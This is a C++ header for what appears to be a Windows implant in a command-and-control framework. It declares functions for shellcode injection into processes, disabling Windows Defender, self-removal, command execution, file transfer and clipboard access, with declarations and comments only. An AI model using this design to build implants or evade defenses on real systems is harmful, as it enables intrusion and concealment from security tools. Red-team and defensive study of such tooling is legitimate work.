#ifndef CMD_H
#define CMD_H

#include <windows.h>
#include <string>
#include <vector>
#include <map>
#include "profile.h"


/**
 * Functions for command line execution
*/
LPBYTE ExecuteCmd(LPCSTR szCmdline, PSIZE_T stOut);
LPBYTE ExecuteCmdArgVector(std::vector<std::string> args, PSIZE_T outSize);

/**
 * Stops a given implant and removes it from the system
*/
void SelfDestruct();

/**
 * Get basic system information about this system
*/
std::string SysInfo();

/**
 * Takes in a JSON object of changes to make to the profile and updates the profile
*/
void UpdateProfile(rapidjson::Value* changes, MalleableProfile* currentProfile);

/**
 * Saves the decoded contents of `b64Contents` to `fileName`
*/
std::string Upload(std::string fileName, std::string b64Contents);

/**
 * Downloads the file at `filepath` and returns the base64 encoded contents
*/
std::string Download(std::string filepath);

/**
 * Injects the base64 encoded shellcode into the process with name `processName`
*/
std::string Inject(std::string b64shellcode, std::string processName);

/**
 * Change the current working directory to `path`
*/
bool ChangeDir(std::string path);

/**
 * Returns the current working directory
*/
std::string GetDir();

/**
 * Returns a map of all environment variables
*/
std::map<std::string, std::string> GetAllEnvVars();

/**
 * Gets all files in the current working directory
*/
std::vector<std::string> GetAllFilesInCurrentDirectory();

/**
 * Gets all running processes and their PIDs
*/
std::map<std::string, DWORD> GetProcessNameToPIDMap();

/**
 * Gets the username of the current user
*/
std::string Whoami();

/**
 * Disable windows defender. Returns TRUE if successful, FALSE otherwise.
*/
BOOL DisableDefender();

/**
 * Gets the text contents of the clipboard, if any
*/
std::string GetClipboard();

/**
 * Sets the text contents of the clipboard to `contents`
*/
void SetClipboard(std::string contents);

#endif
